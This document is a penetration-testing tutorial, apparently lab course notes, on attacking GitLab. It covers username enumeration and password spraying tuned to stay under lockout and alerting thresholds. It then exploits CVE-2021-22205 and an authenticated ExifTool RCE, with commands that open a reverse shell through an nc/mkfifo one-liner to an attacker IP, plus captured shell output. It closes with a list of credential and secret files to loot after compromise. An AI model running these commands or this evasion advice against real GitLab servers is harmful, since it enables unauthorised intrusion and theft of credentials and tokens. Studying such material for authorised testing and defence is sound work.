## Attacking GitLab

GitLab has accumulated over 553 CVEs and several have resulted in critical remote code execution vulnerabilities affecting widely deployed versions. Even without a working exploit, username enumeration combined with credential reuse or password spraying can deliver initial access on poorly secured instances.

***

## Username Enumeration

GitLab does not classify username enumeration as a vulnerability on its [HackerOne program](https://hackerone.com/gitlab), but it directly enables password spraying attacks and is worth pursuing in every engagement. The enumeration relies on the registration form responding differently to taken versus available usernames.

The Python3 tool [GitLabUserEnum](https://github.com/dpgg101/GitLabUserEnum) automates this against a wordlist: 
```bash
wget https://raw.githubusercontent.com/dpgg101/GitLabUserEnum/main/gitlab_userenum.py
python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ --wordlist users.txt
```

```
[+] The username root exists!
[+] The username bob exists!
```

With a confirmed user list, attempt password spraying with common weak passwords such as `Welcome1`, `Password123`, or `<CompanyName>1`. GitLab's lockout defaults allow up to 10 failed attempts before a 10-minute lockout.  Stay well under that threshold per account and space attempts out to avoid triggering alerts. [github](https://github.com/dpgg101/GitLabUserEnum)

***

## CVE-2021-22205: Unauthenticated RCE via ExifTool

[CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205) is a critical unauthenticated remote code execution vulnerability affecting all GitLab CE/EE versions from 11.9 up to 13.10.2.  GitLab passes uploaded image files to its embedded ExifTool instance for metadata stripping. ExifTool mishandles specially crafted DjVu files (disguised as JPEGs), allowing arbitrary command execution as the `git` user without any authentication.  Despite a patch being released in April 2021, a large number of instances remained unpatched months later and were actively exploited in the wild. 

### Affected Versions

| Branch | Vulnerable | Patched |
|---|---|---|
| 11.9 and above | Yes | - |
| 13.8.x | Before 13.8.8 | 13.8.8 |
| 13.9.x | Before 13.9.6 | 13.9.6 |
| 13.10.x | Before 13.10.3 | 13.10.3 |

### Exploitation

The [Exploit-DB entry 50532](https://www.exploit-db.com/exploits/50532) and [github.com/inspiringz/CVE-2021-22205](https://github.com/inspiringz/CVE-2021-22205) both provide working exploit code. The attack sends a crafted DjVu payload to any file upload endpoint, no authentication required. 

Using the inspiringz Python3 PoC for a reverse shell:

```bash
python3 CVE-2021-22205.py -u http://gitlab.inlanefreight.local:8081 -m rev 10.10.14.15 8443
```

Catch the shell:

```bash
nc -lnvp 8443
```

```
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054

git@app04:~/gitlab-workhorse$ id
uid=996(git) gid=997(git) groups=997(git)
```

The shell lands as the `git` user. From here, check for credentials stored in the GitLab configuration files, look for other user SSH keys stored in the git home directory, and enumerate internal network access from the server.

***

## CVE-2021-22205 vs. Authenticated Exploit (13.10.2)

Two separate exploits target overlapping version ranges:

| CVE | Auth Required | Mechanism | Version Range |
|---|---|---|---|
| CVE-2021-22205 | No | ExifTool DjVu file parsing via any upload endpoint | 11.9 to 13.10.2 |
| [Exploit-DB 49951](https://www.exploit-db.com/exploits/49951) | Yes | ExifTool via image upload in snippet creation | 13.10.2 and below |

The authenticated exploit path using a valid account and the snippet upload:

```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 \
  -u mrb3n -p password1 \
  -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'
```

```
 [github](https://github.com/dpgg101/GitLabUserEnum) Authenticating
Successfully Authenticated
 [github](https://github.com/inspiringz/CVE-2021-22205) Creating Payload
 [rapid7](https://www.rapid7.com/blog/post/2021/11/01/gitlab-unauthenticated-remote-code-execution-cve-2021-22205-exploited-in-the-wild/) Creating Snippet and Uploading
[+] RCE Triggered !!
```

If the instance allows self-registration and is running a vulnerable version, register a free account and immediately use the authenticated exploit, avoiding the need for prior credential access.

***

## Post-Exploitation Priorities on a GitLab Server

Once a shell is obtained, focus on:

- `/etc/gitlab/gitlab.rb` and `/etc/gitlab/gitlab-secrets.json` which contain database passwords, secret keys, and SMTP credentials
- The GitLab database itself for all stored user credentials and tokens
- SSH keys in `/var/opt/gitlab/.ssh/` and user home directories
- CI/CD environment variables stored in the database, which frequently contain cloud provider keys, deployment credentials, and API tokens
- The repositories themselves for hardcoded secrets that may not be visible from the web UI due to access controls
